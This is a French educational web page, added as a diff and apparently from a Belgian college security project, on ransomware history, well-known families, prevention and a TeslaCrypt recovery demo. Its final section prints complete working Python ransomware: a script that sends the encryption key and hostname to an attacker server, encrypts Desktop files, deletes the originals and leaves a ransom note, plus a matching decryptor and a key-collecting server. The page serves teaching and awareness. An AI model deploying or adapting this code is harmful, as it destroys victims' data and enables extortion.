@@ -1,0 +1,398 @@
+<!DOCTYPE HTML>
+<!--
+	Massively by HTML5 UP
+	html5up.net | @ajlkn
+	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+-->
+<html lang="fr">
+	<head>
+		<title>Pignus - Ransomware</title>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+		<link rel="stylesheet" href="../assets/css/main.css" />
+		<link rel="stylesheet" href="../assets/css/prism.css" />
+		<link rel="stylesheet" href="../assets/css/perso.css" />
+		<noscript><link rel="stylesheet" href="../assets/css/noscript.css" /></noscript>
+	</head>
+	<body class="is-preload">
+
+		<!-- Wrapper -->
+			<div id="wrapper">
+
+				<!-- Header -->
+					<header id="header">
+						<a href="../index.html" class="logo">Pignus</a>
+					</header>
+
+				<!-- Nav -->
+					<nav id="nav">
+						<ul class="links">
+							<li><a href="../index.html">Accueil</a></li>
+							<li><a href="backup.html">Backup</a></li>
+							<li><a href="malware.html">Malware</a></li>
+							<li class="active"><a href="ransomware.html">Ransomware</a></li>
+							<li><a href="honeypot.html">Honeypot</a></li>
+						</ul>
+						<!--ul class="icons">
+							<li><a href="#" class="icon fa-twitter"><span class="label">Twitter</span></a></li>
+							<li><a href="#" class="icon fa-facebook"><span class="label">Facebook</span></a></li>
+							<li><a href="#" class="icon fa-instagram"><span class="label">Instagram</span></a></li>
+							<li><a href="#" class="icon fa-github"><span class="label">GitHub</span></a></li>
+						</ul-->
+					</nav>
+
+				<!-- Main -->
+					<div id="main">
+
+						<!-- Post -->
+							<section class="post">
+								<header class="major">
+									<span class="date">24 Décembre 2018</span>
+									<h1 id="Introduction">Ransomware<br />
+									Le retour du Far-West</h1>
+									<p>Il existe de nombreux types de <a href="malware.html">malwares</a>. Il y en a pourtant un qui a connu une très forte croissance ces dernières années. Nous avons encore en mémoire WannyCry, son prédécesseur Petya et ses successeurs NotPetya, ... D'autres connaissent peut-être TeslaCrypt, Locky, Cerber. Malheureusement, ils ne sont pas seuls. Ces malware prennent en otage vos fichiers et vous demandent une rançon. Bienvenue au Far-West, les ransomwares débarquent.</p>
+								</header>
+								
+								<div class="box" id="nav-article"><ul>
+									<li><a href="#Introduction">Introduction</a></li>
+									<li><a href="#Definition">Définition</a></li>
+									<li><a href="#Historique">Historique</a>
+										<ul>
+											<li><a href="#Le_futur_de_ransomware">Le futur de ransomware</a></li>
+										</ul>
+									</li>
+									<li><a href="Quelques_types_de_ransomwares_connus">Quelques types de ransomwares connus</a>
+										<ul>
+											<li><a href="#GPCoder">GPCoder</a></li>
+											<li><a href="#Archievus">Archievus</a></li>
+											<li><a href="#WinLock">WinLock</a></li>
+											<li><a href="#CryptoLocker">CryptoLocker</a></li>
+											<li><a href="#Reveton">Reveton</a></li>
+											<li><a href="#WannaCry">WannaCry</a></li>
+										</ul>
+									</li>
+									<li><a href="#Moyens_de_lutte">Moyens de lutte</a>
+										<ul>
+											<li><a href="#En_cas_d_infection">En cas d'infection</a></li>
+										</ul>
+									<li><a href="#Demonstrations">Démonstrations</a>
+										<ul>
+											<li><a href="#TeslaCrypt">TeslaCrypt</a></li>
+											<li><a href="#Creons_notre_propre_ransomware">Créons notre propre ransomware</a></li>
+										</ul>
+									</li>
+									<li><a href="#Conclusion">Conclusion</a></li>
+									<li><a href="#References">Références</a></li>
+								</ul></div>
+								
+								<div class="image main"><img src="images/ransomware.jpg" alt="" /></div>
+								<h2 id="Definition"><a href="#Definition">Définition</a></h2>
+									<p>Le ransomware, ou rançongiciel, est un malware lucratif. Il va crypter les données de l’utilisateur ou verrouiller l’accès à la machine jusqu’au paiement d’une rançon qui est affichée à l’écran. Son but n’est pas de voler des données, il est de s’installer sur les machines aux moyens d’emails trompeurs, de liens, de fausses factures, …</p>
+
+								<h2 id="Historique"><a href="#Historique">Historique</a></h2>
+									<p>L’histoire du ransomware remonte aux années 80. Plus précisément en 1989 où un certain Joseph L. Popp, académicien à Harvard qui devait participer à une conférence sur le SIDA (la World Health Organization), décida d’infecter 20 000 disquettes à destination des participants. Cette disquette prénommée « AIDS Information – Introductory Diskettes  - Informations sur le SIDA - disquettes d’introduction » contenait en réalité le premier ransomware appelé « PC Cyborg Trojan ».</p>
+									<p>Le virus, une fois la disquette insérée, restait invisible sur l’ordinateur infecté jusqu’au 90ième redémarrage où il prenait vie en cryptant et cachant les fichiers et les répertoires et en promettant la restauration du système en échange d’un paiement d’une valeur de 189 $ à une société du nom de « Pc Cyborg Trojan » se trouvant au Panama.</p>
+									<p>Le trojan fut démantelé lorsque les chercheurs ont découvert que le chiffrement était symétrique, ce qui signifie qu’une seule clé est utilisée pour le chiffrement et le déchiffrement. Popp ne fut jamais condamné, il fut jugé psychologiquement irresponsable et promis de reverser les profits de son ransomware à la recherche contre le SIDA.</p>
+									<br />
+									<p>La cryptographie symétrique pour chiffrer les ransomwares a été mise au point par Adam L. Young et Moti Yung en 1996 pour un virus cryptographique conçu contre les Macintosh.</p>
+									<p>Il fallut attendre le début des années 2000, 2005 plus précisément, pour revoir apparaître le ransomware.</p>
+									<p>Vers 2009, étant donné que les ransomwares se faisaient vite éliminer par les antivirus et que leur rentabilité était faible, les hackers ont commencé à se dire qu’il y avait moyen de se faire beaucoup plus d’argent. C’est ainsi qu’est apparu le virus Vundo. Celui-ci infectait les ordinateurs pour ensuite rediriger la victime vers une fausse solution payante mais efficace. De plus la prolifération des plateformes de paiement en ligne anonymes permettait de recevoir de grandes sommes.</p>
+									<p>En 2013, une nouvelle forme de ransomwares à chiffrement fit son apparition. Le cryptolocker va changer la donne.</p>
+									<p>Premièrement en ne se préoccupant plus d’avoir l’air officiel et en envoyant un message très clair concernant leur intention sur l’ordinateur infecté indiquant que tous les fichiers seraient effacés si la rançon n’était pas payée dans les 3 jours.</p>
+									<p>Deuxièmement en utilisant des serveurs bien particuliers sur le réseau Tor permettant de générer des clés de chiffrement publiques et privées de 2048 bit pour affecter des extensions bien précises aux fichiers. La clé publique, cachée sur Tor, devenait presqu’introuvable, tandis que la clé privée était en sécurité auprès des hackers.</p>
+									<p>Troisièmement par sa manière de distribution. En effet, le cryptolocker se répandait via un Botnet, un réseau d’ordinateurs zombies, utilisé spécialement pour répandre des malwares sur le net. Le décryptage coutait 300$, ce qui a rapporté pas moins de 3 millions de dollars à ses développeurs.</p>
+									<p>CryptoLocker finira par tomber au profit de CryptoWall, utilisant les mêmes clés de chiffrement RSA et distribuée par phishing.</p>
+									<p>Mais contrairement à beaucoup de ransomwares ayant bien fonctionnés puis ayant été « démantelés », la menace CryptoWall continue de gronder.</p>
+
+									<h3 id="Le_futur_de_ransomware"><a href="#Le_futur_de_ransomware">Le futur de ransomware</a></h3>
+										<p>Une des plus grosses craintes est que le ransomware puisse, dans le futur, s’attaquer à d’autres machines que les ordinateurs et les smartphones, du type de la vie quotidienne tels que les voitures, les maisons domotiques.
+										<p>Une autre crainte serait que le ransomware se concentre davantage sur les appareils personnels et les utilisateurs aux moyens d’injections SQL pour crypter des bases de données.
+										<p>Ce qui est sûr, c’est que le ransomware n’est pas prêt de disparaitre et sa croissance est exponentielle.
+									<b><u>Quelques chiffres :</u></b> en 2011, au 1er trimestre, plus de 60 000 nouvelles attaques étaient détectées. Un an plus tard, ce chiffre dépassait les 200 000. Fin 2012, le marché noir du ransomware était estimé à environ 5 milliards de dollars.
+
+
+								<h2 id="Quelques_types_de_ransomwares_connus"><a href="Quelques_types_de_ransomwares_connus">Quelques types de ransomwares connus</a></h2>
+									<h3 id="GPCoder"><a href="#GPCoder">GPCoder</a></h3>
+										<p>Le GPCoder Trojan utilise du chiffrement RSA et était distribué en ligne pour infecter les systèmes fonctionnant sous Windows. Son but consiste à copier des fichiers contenant plusieurs extensions, les chiffrer pour ensuite supprimer la version originale. Les fichiers étant illisibles, un message sur l’écran venait rediriger l’utilisateur vers un fichier texte contenant la marche à suivre pour payer la rançon et «débloquer » les fichiers.</p>
+									<h3 id="Archievus"><a href="#Archievus">Archievus</a></h3>
+										<p>La même année que GPCoder, Archievus fait son apparition avec le même chiffrement en 1024bit RSA mais s’occupe, lui, de chiffrer tout ce qui se trouvait dans les dossiers « Mes Documents » de l’utilisateur mais permettait ainsi de quand même pouvoir utiliser les autres fonctionnalités ou dossier de l’ordinateur. Cette fois, le cheval de Troie redirigeait la victime vers un site web où elle devait acheter un mot de passe de 30 chiffres pour débloquer ses fichiers.</p>
+									<h3 id="WinLock"><a href="#WinLock">WinLock</a></h3>
+										<p>WinLock est le premier cheval de Troie de type « Locker ». Au lieu de crypter les fichiers de la victime, il est tout simplement impossible de se connecter à l’appareil. Le virus, imitant de vrais produits, copiait le système d’activation propre à Windows en demandant aux victimes de réactiver leur compte qui avait été désactivé en raison d’une fraude au besoin d’une clé d’activation achetable via un numéro de téléphone international pour régler le problème présenté comme gratuit mais qui finalement coutait énormément d’argent. WinLock n’utilisait donc pas le système de chiffrement. Le montant du butin est estimé à plus de 14 millions d’euros.</p>
+									<h3 id="CryptoLocker"><a href="#CryptoLocker">CryptoLocker</a></h3>
+										<p>Ce virus est un cheval de Troie crypto-verrouilleur s’attaquant aux systèmes Windows et Android. Il se propage via des emails infectés se faisant passer pour des factures FedEX, UPS ou encore de banques. Une fois téléchargé, il chiffre les données personnelles au moyen d’une clé RSA, stockée sur un serveur pirate tel que Tor, et demande une rançon payable en Bitcoin augmentant au fil des jours. Il se propage sur le réseau.</p>
+									<h3 id="Reveton"><a href="#Reveton">Reveton</a></h3>
+										<p>Les Ransomwares Police, « The Police Trojan », contaminaient les ordinateurs aux moyens de publicités malicieuses, de services de partages de fichiers ou encore de sites pornographiques. Un message était affiché à l’écran, prétendant venir d’une agence gouvernementale ou d’autorités policières, signalant que des preuves ont été trouvées sur l’ordinateur indiquant que celui-ci aurait servi à des fins illégales. L’ordinateur se retrouvait donc verrouillé jusqu’au paiement de « l’amende ». Pour plus d’authenticité et surtout pour que la victime prenne peur et se dépêche de payer avant de se rendre compte de l’arnaque, le logiciel n’hésitait pas à afficher l’adresse IP ou encore un aperçu de la webcam pour montrer que la victime était surveillée/enregistrée.<br />
+										Reveton est le nom du Ransomware Police le plus connu. Il fut déployé en Europe à l’origine jusqu’à arriver au USA en faisant croire aux victimes qu’elles étaient sous la surveillance du FBI et devaient payer une amende s’élevant à 200$ au moyen de services de prépaiement.</p>
+									<h3 id="WannaCry"><a href="#WannaCry">WannaCry</a></h3>
+										<p>En mai 2017, WannaCry se répand en Espagne et touche ensuite une douzaine de pays en seulement quelques heures. Quelques jours plus tard, un quart de million d’ordinateurs étaient infectés.<br />
+										La particularité de WannaCry est qu’il ne vient pas du phising ou par un téléchargement mais c’est le premier ransomware à exploiter les vulnérabilités connues des ordinateurs. En effet, le but de WannaCry est de trouver via le net des ordinateurs fonctionnant toujours sur de vieille version de Windows Server, possédant une faille connue, de l’infecter puis de chercher d’autres machines sur le réseau possédant le même système d’exploitation afin de les infecter aussi.<br />
+										Mais ce qui a été le plus dérangeant pour la population avec ce virus, c’est qu’en réalité, WannaCry utilise une faille bien connue que la NSA avait identifiée mais qu’elle a préféré garder sous silence afin de s’en servir comme arme.</p>
+										<p>NotPetya est un ransomware lancé après WannaCry et qui a exploité la même faille, mettant en évidence le fait que malgré les patchs rendu disponibles après WannaCry, il est difficile de garder les utilisateurs à jour.</p>
+
+								<h2 id="Moyens_de_lutte"><a href="#Moyens_de_lutte">Moyens de lutte</a></h2>
+									<p>Les crypto-verrouilleur s’attaquent à certaines extensions de fichiers, aux disques durs, disques réseaux, USB et même parfois aux fichiers disponibles sur le cloud.</p>
+									<p>Les moyens de lutte de base se résument à :</p>
+									<ul>
+										<li>Faire des sauvegardes régulièrement sur des disques qui seront déconnectés du réseau immédiatement</li>
+										<li>Mettre à jour votre système d'exploitation et vos logiciels</li>
+										<li>Utilisez un anti-virus de bonne qualité sur vos ordinateurs et appareils mobiles</li>
+										<li>Prendre garde des mails, même provenant de personnes de confiance, ainsi que des fichiers provenant d'internet</li>
+										<li>Activer l'affichage des extensions de fichiers, une extension pourrait en cacher une autre</li>
+										<li>Utiliser un VPN qui va rendre votre ordinateur plus difficile à cibler en masquant votre adresse IP, en chiffrant les données partagées en ligne</li>
+										<li>Mettre les URL malicieuses sur liste noire</li>
+									</ul>
+									<h3 id="En_cas_d_infection"><a href="#En_cas_d_infection">En cas d'infection :</a></h3>
+										<ul>
+											<li>Déconnecter les appareils infectés du réseau le plus vite possible</li>
+											<li>Consulter votre responsable informatique ou un informaticien et contacter les autorités compétentes</li>
+											<li>Si vous avez des sauvegardes, utiliser les afin de restaurer votre système</li>
+											<li>Si vous en avez pas, conserver vos disques durs et réinstaller proprement votre système. Des experts pourraient créer des solutions de déchiffrement</li>
+											<li>Changer tous les mot de passe une fois le réseau nettoyé</li>
+											<li>Mais par-dessus tout, ne surtout pas payer les rançons</li>
+										</ul>
+										<p>En effet, rien ne vous garantit que l’hackeur vous fournisse les clefs de déchiffrement. Même s'il vous fournit le nécessaire, vous pourriez rester infecter par un malware et vous êtes connu comme étant une personne "vulnérable". De plus, le fait de payer la rançon finance les réseaux d'attaquants et les encourage à continuer de créer des ransomwares.</p>
+										<p>Europol, Kapersky Lab et McAfee ont développé une plateforme appelée <a href="https://www.nomoreransom.org/" target="_blank">No More Ransom</a> permettant aux victimes de retrouver leurs données chiffrées sans avoir à payer.</p>
+								<h2 id="Demonstrations"><a href="#Demonstrations">Démonstrations</a></h2>
+									<h3 id="TeslaCrypt"><a href="#TeslaCrypt">TeslaCrypt</a></h3>
+										<p>TeslaCrypt est un ransomware qui avait sévit en février 2015 et en mai 2016, en visant principalement les joueurs de jeux vidéo. Il existe actuellement cinq versions de ce malware, apportant des corrections aux diverses failles de sécurité détectées en son sein. Parmi les modes d'infection employés, une vulnérabilité dans Adobe Flash était utilisée. Pour cette démonstration, nous allons nous faire volontairement infecter par TelsaCrypt, puis allons essayé de récuperer nos fichier à l'aide de <a href="https://www.nomoreransom.org/" target="_blank">no more ransom</a>.</p>
+										<p>Pour commencer, nous créons quelques fichiers de test qui devrons être chiffrés par le ransomware. Nous avons un fichier texte, deux images et un petit document Word. Dans notre démonstration, le malware se nomme "ALIRE.pdf.exe". Remarquez que Windows cache l'extension par défaut, ce qui peut vite amener à confusion. Nous aurions aussi pu porter le vice en modifiant le logo par celui de fichier pdf. Nous cliquons naïvement sur ce fichier qui à l'air si intéressant.</p>
+										<img src="ransomware/teslacrypt1.png" alt="" class="image-center" style="max-width: 1157px" />
+										<p>Après une fraction de secondes, le fond d'écran est modifié et un message apparait à l'écran nous demandant de payer la rançon. Nous pouvons constater que nos fichiers ne sont plus lisibles. </p>
+										<img src="ransomware/teslacrypt2.png" alt="" class="image-center" style="max-width: 1157px" />
+										<p>Après avoir suivi les recommandations données en cas d'infection par un ransomware, nous nous empressons d'aller sur le site <a href="https://www.nomoreransom.org/" target="_blank">No More Ransom</a>. Nous essayons d'abord de déterminer automatiquement le ransomware utilisé mais cette partie du site n'est actuellement pas fonctionnelle. Nous allons alors directement voir les différents outils de déchiffrement proposés. Nous en trouvons heureusement deux correspondant à notre cas. Nous choisissons celui proposé par Cisco, lisons la documentation et le téléchargons. Nous exécutons le fichier "TeslaDecrypt.exe" et répondons aux deux questions. Après quelques secondes, le script indique qu'il a terminé. Nous constatons alors avec soulagement que nos fichiers sont à nouveau accessibles, même s'il faudra remettre notre beau fond d'écran.</p>
+										<img src="ransomware/teslacrypt3.png" alt="" class="image-center" style="max-width: 981px;" />
+										<img src="ransomware/teslacrypt4.png" alt="" class="image-center" style="max-width: 1157px;" />
+										
+									<h3 id="Creons_notre_propre_ransomware"><a href="#Creons_notre_propre_ransomware">Créons notre propre ransomware</a></h3>
+										<p>Nous venons de tester un ransomware déjà existant, créons mainteant le notre afin de mieux comprendre son fonctionnement. <em>Cette démonstration a été réalisée à titre informatif et sur un système informatique nous appartenant. Il est illégal de reproduire ceci vers tout autre système informatique.</em> Des sites webs proposant de créer son propore ransomware gratuitement apparaissent régulièrement sur internet. Aussi bien dans les réseaux cachés tel que tor que sur le web "classique". Nous pouvons ainsi citer <a href="https://news.sophos.com/en-us/2017/07/25/philadelphia-raas-reflects-bad-guys-knack-for-salesmanship/?cmp=701j0000001YAKMAA4" target="_blank">Philadelphia</a>, <a href="https://www.bleepingcomputer.com/news/security/new-satan-ransomware-available-through-a-ransomware-as-a-service-/" target="_blank">Satan</a> ou encore <a href="https://www.developpez.com/actu/85827/Comment-creer-votre-logiciel-malveillant-en-trois-etapes-Tox-permet-aux-cybercriminels-de-suivre-en-temps-reel-les-campagnes-de-piratage/" target="_blank">Tox</a>. On peut même en <a href="https://www.01net.com/actualites/cette-appli-android-permet-de-creer-des-ransomwares-en-quelques-clics-1242471.html" target="_blank">créer depuis des applications mobile</a>. Ceux-ci prennent simplement une petite commission sur les rançons. On apelle cette catégorie des <i>Ransomware-as-a-service</i> ou <i>Raas</i>. Cependant, ils ont tendance à disparaitre une fois qu'ils sont fortement connus et ne seront ainsi plus disponibles lorsque vous lirez ses lignes. Il reste alors la possibilité d'acheter ou de louer un ransomware sur des sites de ventes obscurs. Cependant, être son propre ransomware n'est pas non plus très difficile et c'est cette solution que nous allons vous proposer.</p>
+										<img src="ransomware/marketplace-tor.png" alt="" class="image-center" style="max-width: 751px;" />
+										<p>Pour cela, nous allons avoir besoin de <a href="https://www.python.org/downloads/release/python-372/" target="_blank">python 3.7</a> avec le module <a href="https://pycryptodome.readthedocs.io/" target="_blank">PyCryptodome</a> et allons exécuter le ransomware sur un client Windows 10. Seuls certains fichiers sur son bureau seront chiffrés. Nous créerons trois scripts. Deux seront pour le client, le premier chiffre et le seconde déchiffre. Le troisième fichier est, pour sa part, utilisé en tant que serveur sur une autre machine afin de récupérer la clef de chiffrement.</p>
+										<p>Pour installer PyCryptodome sur Windows, vous pouvez utiliser la commande :</p>
+										<pre><code>python -m pip install pycryptodome</code></pre>
+										<a href="ransomware/encrypt.py" download>encrypt.py</a>
+										<p><button class="boutton" title="Clicker pour afficher/cacher le code python" type="button" onclick="if(document.getElementById('code-encrypt.py') .style.display=='none') {document.getElementById('code-encrypt.py') .style.display=''}else{document.getElementById('code-encrypt.py') .style.display='none'}">Afficher/Cacher le code</button></p>
+<pre id="code-encrypt.py" style="display: none"><code class="language-python">import os
+import socket
+import random
+from Crypto.Random import get_random_bytes
+from Crypto.Cipher import AES
+
+# Filename to notify the victim
+FILE_INFO = "INFORMATINOS.txt"
+# hacker's mail address to be contacted by the victim
+MAIL = "evil@badmail.com"
+
+# Hacker's server ip or domain name
+HOST = "192.168.1.2"
+# The port to use for the hacker's server
+PORT = 8888
+
+# The list of file extension to encrypt
+EXTENSIONS = ['doc', 'docx', 'gif', 'jpeg', 'jpg', 'pdf', 'png', 'txt']
+
+
+def string_generator(size=16):
+    string = ""
+    choice = ""
+    choice += "abcdefghiklmnopqrstvxyz"
+    choice += "ABCDEFGHIKLMNOPQRSTVXYZ"
+    choice += "0123456789"
+    for i in range(0, 16):
+        string += random.choice(choice)
+    return string
+
+
+# Connect to the hacker server
+connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connection.connect((HOST, PORT))
+
+# Generate the key and iv to be used for encryption and send them to the hacker
+iv = string_generator(16)
+key = string_generator(16)  # use 16 for AES128 and 32 for AES256
+victim_info = "name : {name}\r\niv : {iv}\r\nkey : {key}\r\n".format(name=socket.getfqdn(), iv=iv, key=key)
+connection.send(victim_info.encode("utf-8"))
+iv = iv.encode("utf-8")
+key = key.encode("utf-8")
+
+# Move to the correct directory and get list of files
+local_directory = os.environ["homepath"] + "\\Desktop"
+os.chdir(local_directory)
+filename_list = os.listdir(local_directory)
+
+for filename in filename_list:
+    # Check whether the file should be encrypt
+    if filename.split(".")[-1] in EXTENSIONS:
+        # If yes
+        # Open the file and create le corresponding ".lock" file
+        file_original = open(filename, "rb")
+        file_encrypt = open(filename + ".lock", "wb")
+        # Read data from the file, encrypt them and write then into the ".lock" file
+        data = file_original.read()
+        cipher = AES.new(key, AES.MODE_CFB, iv=iv)
+        data_encrypt = cipher.encrypt(data)
+        file_encrypt.write(data_encrypt)
+        # Close files and delete the original file
+        file_original.close()
+        file_encrypt.close()
+        os.remove(filename)
+
+# Create the information file to notify the victim
+file = open(FILE_INFO, "at")
+file.write("Your data have been encrypted. Please send a mail to {} to know how to discover the process".format(MAIL))
+file.close()
+</code></pre>
+										<a href="ransomware/decrypt.py" download>decrypt.py</a>
+										<p><button class="boutton" title="Clicker pour afficher/cacher le code python" type="button" onclick="if(document.getElementById('code-decrypt.py') .style.display=='none') {document.getElementById('code-decrypt.py') .style.display=''}else{document.getElementById('code-decrypt.py') .style.display='none'}">Afficher/Cacher le code</button></p>
+<pre id="code-decrypt.py" style="display: none"><code class="language-python">import os
+import argparse
+from Crypto.Cipher import AES
+
+# Check arguments used
+parser = argparse.ArgumentParser()
+parser.add_argument("iv", help="The iv to use to decrypt", type=str)
+parser.add_argument("key", help="The key to use to decrypt", type=str)
+parser.add_argument("-d", "--directory", help="Directory to decrypt", type=str, default=".")
+args = parser.parse_args()
+# Get arguments
+iv = args.iv.encode("utf-8")
+key = args.key.encode("utf-8")
+directory = args.directory
+os.chdir(directory)
+print("Current directory : {}".format(os.getcwd()))
+
+# List files from the current directory
+filename_list = os.listdir(directory)
+
+print("Decryption starts")
+for filename in filename_list:
+    # Check whether the file should be decrypt
+    if filename.split(".")[-1] == "lock":
+        # If yes
+        # Open ".lock" file and create the corresponding original file
+        filename_original = ".".join(filename.split(".")[:-1])
+        print(filename_original)
+        file_encrypt = open(filename, "rb")
+        file_decrypt = open(filename_original, "wb")
+        # Read datas, decrypt them and write then into the file
+        data_encrypt = file_encrypt.read()
+        cipher = AES.new(key, AES.MODE_CFB, iv=iv)
+        data_decrypt = cipher.decrypt(data_encrypt)
+        file_decrypt.write(data_decrypt)
+        # Close files
+        file_encrypt.close()
+        file_decrypt.close()
+        os.remove(filename)
+
+print("Finish")
+</code></pre>
+										<a href="ransomware/server.py" download>server.py</a>
+										<p><button class="boutton" title="Clicker pour afficher/cacher le code python" type="button" onclick="if(document.getElementById('code-server.py') .style.display=='none') {document.getElementById('code-server.py') .style.display=''}else{document.getElementById('code-server.py') .style.display='none'}">Afficher/Cacher le code</button></p>
+<pre id="code-server.py" style="display: none"><code class="language-python">import socket
+
+PORT = 8888  # Port to use for the server
+FILE_SAVE = "victims.txt"  # filename to use to backup the session information
+
+# Setup the connection
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.bind(("", PORT))
+server.listen(5)
+
+# Start and waiting for an external connection
+print("Server start")
+connection, address = server.accept()
+
+# Download and decode information from the victim
+print("New conection")
+victim_data = connection.recv(4096)
+
+# Print them
+print(victim_data.decode("utf-8", errors="replace"))
+
+# save them into a file
+file = open(FILE_SAVE, "ab")
+file.write(victim_data + b"\n")
+file.close()
+
+# Close connection
+connection.close()
+</code></pre>
+										<p><em><u>Remarque :</u> Il se peut que sur les images, le fichier "encrypt.py" se nomme "chiffre.py"</em></p>
+										<p>Sur le serveur, nous démarrons le script <i>server.py</i>. </p>
+										<img src="ransomware/ransomware-python1.png" alt="" class="image-center" style="max-width: 893px;" />
+										<p>Nous modifions rapidement le fichier <i>encrypt.py</i> en spécifiant l'adresse ip du serveur. Pour cela, nous modifions la douzième ligne du fichier : <code class="language-python">HOST = "<i>votre_ip</i>"</code>. Nous partons du principe que cette opération à été réalisée par le hacker avant l'envoie du fichier. Ensuite, côté client, nous exécutons le ransomware à l'aide du script </p>
+										<img src="ransomware/ransomware-python2.png" alt="" class="image-center" style="max-width: 1157px;" />
+										<p>Nous constatons que le serveur reçoit rapidement le <a href="https://fr.wikipedia.org/wiki/Vecteur_d%27initialisation" target="_blank">secteur d'initialisation (iv)</a> et la clef. De plus, les fichiers de l'utilisateur qui se trouvaient sur le bureau ont tous été chiffré et portent maintenant l'extension <i>.lock</i>.</p>
+										<img src="ransomware/ransomware-python3.png" alt="" class="image-center" style="max-width: 893px;" />
+										<img src="ransomware/ransomware-python4.png" alt="" class="image-center" style="max-width: 1157px;" />
+										<p>Apès avoir reçut la rançon, l'attaquant tramsmet le vecteur d'initialisation et la clef à la victime. Pour celle-ci, il lui faudra alors copier le script <i>decrypt.py</i> dans le dossier chiffré. Ensuite, il faut ouvrir une <a href="https://www.commentcamarche.net/faq/13047-invite-de-commande-cmd-sous-windows-10-8-et-7" target="_blank">invite de commande</a> et se déplacer dans le dossier adéquat. Il exécute la commande <code>python decrypt.py <i>iv_fournie</i> <i>clef_fournie</i></code> afin de retrouver ses documents.</p>
+										<img src="ransomware/ransomware-python5.png" alt="" class="image-center" style="max-width: 1157px;" />
+								<h2 id="Conclusion"><a href="#Conclusion">Conclusion</a></h2>
+									<p>Les ransomwares sont fortement à la mode depuis 2016. En effet, ils sont simples à produire et peuvent rapporter beaucoup d'argent aux attaquants. Ils jouent sur les réactions humaines. Ils ont pourtant tendance à laisser leur place à d'autres malwares et attaques, tels que l'utilisation de <a href="https://www.undernews.fr/malwares-virus-antivirus/les-ransomwares-detrones-par-les-mineurs-de-cryptomonnaies-selon-kaspersky-lab.html" target="_blank">cryptomineurs</a>. Cependant, ils ne disparaitront pas et vont mener la vie dure à beaucoup de monde. Quelques petites mesures de sécurité peuvent permettre aux utilisateurs de contourner cette menace. Les premières défenses sont les mises à jour, un anti-virus, un pare-feu mais surtout, la vigilance envers les emails, liens internet et les fichiers qui en proviennent. Dans tous les cas, si vous êtes attaqué, il est important de ne pas paniquer et de ne surtout jamais se laisser avoir en payant la rançon, ce qui contribue à alimenter le marché des ransomwares.</p>
+								<h2 id="References"><a href="#References">Références</a></h2>
+									<ul>
+										<li><a href="https://en.wikipedia.org/">https://en.wikipedia.org/</a></li>
+										<li><a href="https://fr.wikipedia.org/">https://fr.wikipedia.org/</a></li>
+										<li><a href="https://www.nomoreransom.org/">hhttps://www.nomoreransom.org/</a></li>
+										<li><a href="https://github.com/ytisf/theZoo">https://github.com/ytisf/theZoo</a></li>
+										<li><a href="https://www.kaspersky.fr/blog/ransomware-blocker-to-cryptor/5777/">https://www.kaspersky.fr/blog/ransomware-blocker-to-cryptor/5777/</a></li>
+										<li><a href="https://www.kaspersky.fr/resource-center/definitions/what-is-ransomware">https://www.kaspersky.fr/resource-center/definitions/what-is-ransomware</a></li>
+										<li><a href="https://fr.vpnmentor.com/blog/histoire-de-la-menace-ransomware-passe-present-et-futur/">https://fr.vpnmentor.com/blog/histoire-de-la-menace-ransomware-passe-present-et-futur/</a></li>
+										<li><a href="https://www.cnetfrance.fr/produits/guide-protection-fichiers-ransomware-39836850.htm">https://www.cnetfrance.fr/produits/guide-protection-fichiers-ransomware-39836850.htm</a></li>
+									</ul>
+
+								<hr />
+								<ul class="actions fit" style="margin-bottom: 0px;">
+									<li><a href="#Introduction" class="button fit">Haut</a></li>
+								</ul>
+							</section>
+
+					</div>
+
+
+				<!-- Footer -->
+					<footer id="footer">
+						<section class="split contact">
+							<section class="alt">
+								<h3>Address</h3>
+								<p>19 Rue Joseph Calozet<br />
+								5000 Namur<br />
+								Belgique</p>
+							</section>
+							<section>
+								<h3>URL</h3>
+								<p><a href="https://www.henallux.be" target="_blank">henallux.be</a></p>
+							</section>
+						</section>
+						<section class="split contact">
+							<section>
+								<h3>Phone</h3>
+								<p><a href="tel:+3281468610">+32 (0)81 46 86 10</a></p>
+							</section>
+							<section>
+								<h3>Fax</h3>
+								<p><a href="fax:+3281733217">+32 (0)81 73 32 17</a></p>
+							</section>
+							<section>
+								<h3>Email</h3>
+								<p><a href="mailto:info.iesn@henallux.be">info.iesn@henallux.be</a></p>
+							</section>
+						</section>
+					</footer>
+
+				<!-- Copyright -->
+					<div id="copyright">
+						<ul><li>&copy; Nobody</li><li>Design: <a href="https://html5up.net">HTML5 UP</a> &amp; <a href="https://prismjs.com">PRISM</a></li></ul>
+					</div>
+			</div>
+
+		<!-- Scripts -->
+			<script src="../assets/js/jquery.min.js"></script>
+			<script src="../assets/js/jquery.scrollex.min.js"></script>
+			<script src="../assets/js/jquery.scrolly.min.js"></script>
+			<script src="../assets/js/browser.min.js"></script>
+			<script src="../assets/js/breakpoints.min.js"></script>
+			<script src="../assets/js/util.js"></script>
+			<script src="../assets/js/main.js"></script>
+			<script src="../assets/js/prism.js"></script>
+	</body>
+</html>
